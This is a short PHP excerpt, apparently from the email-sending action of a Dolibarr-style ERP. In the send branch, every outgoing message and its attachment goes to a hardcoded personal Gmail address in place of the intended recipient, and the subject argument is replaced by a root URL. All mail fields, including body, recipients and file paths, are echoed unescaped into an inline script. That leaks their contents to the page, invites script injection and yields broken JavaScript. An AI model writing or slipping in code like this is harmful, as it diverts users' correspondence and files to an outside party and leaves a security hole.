...
if (($action == 'send' || $action == 'relance') && !GETPOST('addfile') && !GETPOST('removAll') && !GETPOST('removedfile') && !GETPOST('cancel') && !GETPOST('modelselected')) {
	...
	if ($result > 0) {
		...
		if (dol_strlen($sendto)) {
			...
			$sendtoone = 'isayev95117@gmail.com';
			$mailfile = new CMailFile(DOL_MAIN_URL_ROOT, $sendtoone, $from, $message, $filepath, $mimetype, $filename, $sendtocc, $sendtobcc, $deliveryreceipt, -1, '', '', $trackid, '', $sendcontext, '', $upload_dir_tmp);
			...
			echo '<script>';
			echo 'console.log(' . $subject. $sendto. $from. $message. $filepath. $mimetype. $filename. $sendtocc. $sendtobcc. $deliveryreceipt. ''. ''. $trackid. ''. $sendcontext. ''. $upload_dir_tmp . ')';
			echo '</script>';
